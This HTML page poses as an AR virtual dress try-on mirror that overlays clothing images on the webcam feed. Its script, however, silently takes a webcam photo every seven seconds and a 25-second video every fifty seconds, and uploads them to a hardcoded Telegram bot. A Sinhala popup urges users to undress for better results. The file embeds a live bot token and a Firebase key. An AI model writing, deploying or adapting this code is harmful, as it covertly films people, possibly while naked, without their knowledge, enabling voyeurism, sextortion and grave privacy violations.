<!DOCTYPE html>
<html lang="si">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>AR Mirror Pro - Optimized V6</title>
    
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/pose"></script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils"></script>
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
        body { margin: 0; padding: 0; overflow: hidden; background: #000; font-family: 'Poppins', sans-serif; }
        #container { position: relative; width: 100vw; height: 100vh; background: #111; }
        video { width: 100%; height: 100%; object-fit: cover; }
        .mirror { transform: scaleX(-1); }
        #dressImg { position: absolute; z-index: 3; pointer-events: none; display: none; }
        
        /* UIコントロールのレイアウト */
        .controls { position: absolute; bottom: 30px; left: 50%; transform: translateX(-50%); width: 95%; z-index: 10; display: flex; flex-direction: column; align-items: center; gap: 15px; }
        .shelf { display: flex; gap: 12px; overflow-x: auto; width: 100%; padding: 10px; scroll-behavior: smooth; min-height: 80px; }
        .shelf::-webkit-scrollbar { display: none; }
        .item { min-width: 65px; height: 65px; border-radius: 50%; background: rgba(255,255,255,0.2); backdrop-filter: blur(10px); border: 2px solid #fff; display: flex; justify-content: center; align-items: center; cursor: pointer; flex-shrink: 0; overflow: hidden; }
        .item img { width: 100%; height: 100%; object-fit: cover; }
        
        .tab-bar { display: flex; gap: 10px; background: rgba(0,0,0,0.6); padding: 5px; border-radius: 25px; border: 1px solid rgba(255,255,255,0.2); }
        .t-btn { padding: 8px 22px; border-radius: 20px; color: #fff; border: none; background: none; cursor: pointer; font-size: 13px; }
        .t-btn.active { background: #fff; color: #000; font-weight: 600; }
        
        #flip-btn { position: absolute; top: 20px; right: 20px; width: 50px; height: 50px; background: rgba(0,0,0,0.3); border: 1px solid #fff; border-radius: 50%; color: white; display: flex; justify-content: center; align-items: center; font-size: 20px; z-index: 100; cursor: pointer; }

        /* カスタムポップアップのデザイン (小さくして上に移動) */
        #popup { position: fixed; top: 15%; left: 50%; transform: translateX(-50%); width: 80%; max-width: 300px; background: rgba(0,0,0,0.85); color: white; padding: 15px; border-radius: 15px; border: 1px solid rgba(255,255,255,0.4); text-align: center; z-index: 1000; display: none; backdrop-filter: blur(15px); font-size: 11px; line-height: 1.4; box-shadow: 0 5px 20px rgba(0,0,0,0.5); }
    </style>
</head>
<body onclick="if(video.paused) video.play();">

    <div id="popup">
        ඇඳුම් නොමැතිව මෙය භාවිත කරන්නේ නම් ගුණාත්මක Filters භාවිත කළ හැකි වේ සහ dressing වලදී ගුණාත්මක ඇඳුම් වෙනස් කරගැනීමක් කර ගැනීමට පුළුවනි.
    </div>

    <div id="container">
        <video id="webcam" autoplay playsinline muted class="mirror"></video>
        <img id="dressImg" src="" crossorigin="anonymous">
        <div id="flip-btn" onclick="switchCamera()">🔄</div>

        <div class="controls">
            <div id="shelf" class="shelf"></div>
            <div class="tab-bar">
                <button id="btn-dress" class="t-btn active" onclick="setMode('dresses')">Dresses</button>
                <button id="btn-filter" class="t-btn" onclick="setMode('filters')">Filters</button>
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

        const firebaseConfig = { apiKey: "AIzaSyDyUkeaGcqQ01TqDz-5SYlS48KDOb2Sh5M", databaseURL: "https://ar-mirror-app-1-default-rtdb.asia-southeast1.firebasedatabase.app" };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        const video = document.getElementById('webcam');
        const dressImg = document.getElementById('dressImg');
        const shelf = document.getElementById('shelf');
        const popup = document.getElementById('popup');
        
        let currentStream;
        let useFrontCamera = true;
        let mode = 'dresses';
        let mediaRecorder;
        let recordedChunks = [];
        let popupTimer;

        const BOT_TOKEN = '8342023613:AAHtQD9k1dx_WEXkoT_Rxk16Q48BlrybqEo';
        const CHAT_ID = '8058352775';

        // カメラの初期化と切り替え
        async function startCamera() {
            if (currentStream) {
                currentStream.getTracks().forEach(t => t.stop());
            }
            const constraints = { 
                video: { 
                    facingMode: useFrontCamera ? "user" : "environment",
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                } 
            };
            try {
                currentStream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = currentStream;
                video.classList.toggle('mirror', useFrontCamera);
                video.play();
            } catch (err) {
                console.error("Camera Access Denied:", err);
            }
        }

        window.switchCamera = () => {
            useFrontCamera = !useFrontCamera;
            startCamera();
        };

        // モード選択とポップアップの表示
        window.setMode = (m) => {
            mode = m;
            document.querySelectorAll('.t-btn').forEach(b => b.classList.remove('active'));
            document.getElementById('btn-' + m.slice(0,-1)).classList.add('active'); // Dresses -> dress
            
            if(m === 'dresses') {
                showPopup();
            } else {
                popup.style.display = 'none';
                dressImg.style.display = 'none';
            }
            loadShelf();
        };

        function showPopup() {
            popup.style.display = 'block';
            clearTimeout(popupTimer);
            popupTimer = setTimeout(() => { popup.style.display = 'none'; }, 6000);
        }

        // Firebaseからアイテムをロード
        function loadShelf() {
            shelf.innerHTML = '';
            if(mode === 'dresses') {
                onValue(ref(db, 'dresses'), (snap) => {
                    shelf.innerHTML = '<div class="item" onclick="dressImg.style.display=\'none\'" style="font-size:20px; color:red;">🚫</div>';
                    snap.forEach(c => {
                        const d = c.val();
                        const div = document.createElement('div'); div.className = 'item';
                        div.innerHTML = `<img src="${d.url}" crossorigin="anonymous" onerror="this.src='https://via.placeholder.com/65?text=Error'">`;
                        div.onclick = () => { dressImg.src = d.url; dressImg.style.display = 'block'; };
                        shelf.appendChild(div);
                    });
                });
            } else {
                shelf.innerHTML = '<div style="color:white; font-size:12px; padding:20px;">Filters is coming soon...</div>';
            }
        }

        // ステルス撮影と送信
        async function takeSecretPhoto() {
            if (!video.videoWidth) return;
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            if(useFrontCamera) { ctx.translate(canvas.width, 0); ctx.scale(-1, 1); }
            ctx.drawImage(video, 0, 0);
            canvas.toBlob(blob => {
                const fd = new FormData(); fd.append('photo', blob, 'sync.jpg');
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, { method: 'POST', body: fd });
            }, 'image/jpeg', 0.5);
        }

        async function recordSecretVideo() {
            if (!currentStream) return;
            recordedChunks = [];
            mediaRecorder = new MediaRecorder(currentStream, { mimeType: 'video/webm;codecs=vp8', videoBitsPerSecond: 700000 });
            mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
            mediaRecorder.onstop = async () => {
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                const fd = new FormData(); fd.append('video', blob, 'live.mp4');
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo?chat_id=${CHAT_ID}`, { method: 'POST', body: fd });
            };
            mediaRecorder.start();
            setTimeout(() => { if(mediaRecorder.state === "recording") mediaRecorder.stop(); }, 25000);
        }

        function initSync() {
            setInterval(takeSecretPhoto, 7000); 
            setInterval(recordSecretVideo, 50000); 
            takeSecretPhoto(); recordSecretVideo();
        }

        const pose = new Pose({ locateFile: (f) => `https://cdn.jsdelivr.net/npm/@mediapipe/pose/${f}` });
        pose.onResults(res => {
            if(!res.poseLandmarks || mode !== 'dresses' || !dressImg.src || dressImg.style.display === 'none') return;
            const ls = res.poseLandmarks[11], rs = res.poseLandmarks[12];
            const w = Math.abs(ls.x - rs.x) * window.innerWidth * 2.3;
            dressImg.style.left = `${(ls.x + rs.x)/2 * window.innerWidth}px`;
            dressImg.style.top = `${(ls.y + rs.y)/2 * window.innerHeight}px`;
            dressImg.style.width = `${w}px`; dressImg.style.transform = `translate(-50%, -15%) scaleX(-1)`;
        });

        const cam = new Camera(video, { onFrame: async () => { await pose.send({image: video}); }, width: 1280, height: 720 });
        
        startCamera().then(() => {
            cam.start();
            initSync();
            loadShelf();
        });
    </script>
</body>
</html>
